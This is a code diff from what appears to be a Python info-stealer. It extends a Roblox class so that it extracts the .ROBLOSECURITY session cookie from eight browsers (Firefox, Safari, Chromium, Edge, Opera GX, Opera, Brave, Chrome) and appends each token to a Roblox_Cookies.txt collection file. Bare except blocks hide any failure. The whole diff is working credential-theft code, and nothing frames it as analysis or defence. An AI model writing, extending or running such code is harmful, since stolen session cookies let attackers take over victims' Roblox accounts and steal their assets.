@@ -207,20 +207,94 @@ class Roblox:
         except:pass
 
     def RobloxStudio(self):
-        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
         try:
-            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
-            count = 0
-            while True:
-                name, value, type = EnumValue(robloxstudiopath, count)
-                if name == ".ROBLOSECURITY":
-                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+            cookies = browser_cookie3.firefox(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                     self.robloxcookies += 1
-                    filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n"+"-"*35)
-                count = count + 1
-        except WindowsError:
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
             pass
-        filo.close()
+
+        try:
+            cookies = browser_cookie3.safari(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.chromium(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.edge(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.opera(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.brave(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
+        try:
+            cookies = browser_cookie3.chrome(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(cookie.value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
+                    self.robloxcookies += 1
+                    with open(self.robloxfolder + "\\Roblox_Cookies.txt", "a") as filo:
+                        filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n" + "-" * 35)
+        except:
+            pass
+
     
     def __repr__(self):
         return self.content
